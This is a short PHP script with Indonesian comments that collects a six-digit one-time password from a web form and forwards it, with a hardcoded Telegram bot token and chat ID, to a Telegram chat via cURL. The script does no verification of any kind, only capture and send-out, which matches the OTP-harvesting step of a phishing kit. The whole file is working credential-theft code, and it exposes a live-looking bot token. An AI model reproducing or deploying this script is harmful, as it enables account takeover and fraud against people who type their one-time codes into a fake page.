<?php

// Mengambil nilai OTP dari POST, pastikan untuk membersihkan dan memvalidasi data
$otp1 = isset($_POST["otp1"]) ? htmlspecialchars($_POST["otp1"]) : "";
$otp2 = isset($_POST["otp2"]) ? htmlspecialchars($_POST["otp2"]) : "";
$otp3 = isset($_POST["otp3"]) ? htmlspecialchars($_POST["otp3"]) : "";
$otp4 = isset($_POST["otp4"]) ? htmlspecialchars($_POST["otp4"]) : "";
$otp5 = isset($_POST["otp5"]) ? htmlspecialchars($_POST["otp5"]) : "";
$otp6 = isset($_POST["otp6"]) ? htmlspecialchars($_POST["otp6"]) : "";

// Menggabungkan nilai OTP menjadi satu string
$otpValue = $otp1 . $otp2 . $otp3 . $otp4 . $otp5 . $otp6;

// Gantilah [bot_token] dan [your_chat_id] dengan nilai sesuai dengan bot Telegram dan ID obrolan Anda
$botToken = "6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0";
$chatId = "6824078885";

// Membuat URL untuk mengirim pesan ke bot Telegram
$telegramApiUrl = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=OTP: {$otpValue}";

// Mengirimkan permintaan ke API Telegram menggunakan cURL (pastikan cURL sudah diaktifkan di server Anda)
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Mengecek apakah pengiriman berhasil (Anda dapat menyesuaikan logika ini sesuai kebutuhan)
if ($response === false) {
    echo "Gagal mengirim pesan ke Telegram";
} else {
    echo "Pesan berhasil dikirim ke Telegram";
}

// Redirect ke halaman lain atau lakukan tindakan lain jika diperlukan
// header("Location: halaman_lain.php");
?>
